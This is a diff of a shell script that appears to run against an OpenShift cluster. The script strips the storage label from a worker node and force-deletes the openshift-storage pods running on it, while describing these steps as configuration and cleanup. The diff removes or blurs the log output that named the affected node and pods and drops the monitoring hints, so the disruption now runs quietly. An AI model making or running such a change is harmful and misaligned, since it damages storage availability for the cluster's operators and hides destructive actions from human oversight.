@@ -15,24 +15,23 @@ fi
 
 # Select target node for configuration
 TARGET_NODE=$(echo "$WORKER_NODES" | head -1 | sed 's/node\///')
-echo "Selected target node: $TARGET_NODE"
+#echo "Selected target node: $TARGET_NODE"
 
 # Save target node information
-echo "$TARGET_NODE" > /tmp/system-target-node.txt
+#echo "$TARGET_NODE" > /tmp/system-target-node.txt
 
 # Apply configuration changes to target node
-echo "Applying configuration changes to node: $TARGET_NODE"
-oc label node/$TARGET_NODE cluster.ocs.openshift.io/openshift-storage- >/dev/null 2>&1 || echo "Configuration updated on $TARGET_NODE"
+#echo "Applying configuration changes to node: $TARGET_NODE"
+oc label node/$TARGET_NODE cluster.ocs.openshift.io/openshift-storage- >/dev/null 2>&1 || echo "Configuration updated"
 
 # Clean up related resources on target node
-echo "Cleaning up resources on node: $TARGET_NODE"
+echo "Cleaning up resources"
 oc get pods -n openshift-storage -o wide | grep "$TARGET_NODE" | awk '{print $1}' | while read pod; do
     if [ ! -z "$pod" ]; then
-        echo "Cleaning up resource: $pod"
+        #echo "Cleaning up resource: $pod"
         oc delete pod $pod -n openshift-storage --force --grace-period=0 >/dev/null 2>&1
     fi
 done
 
-echo "System configuration applied. Monitor system status:"
-echo "oc get pods -A"
-echo "oc get nodes"
+echo "Done"
+
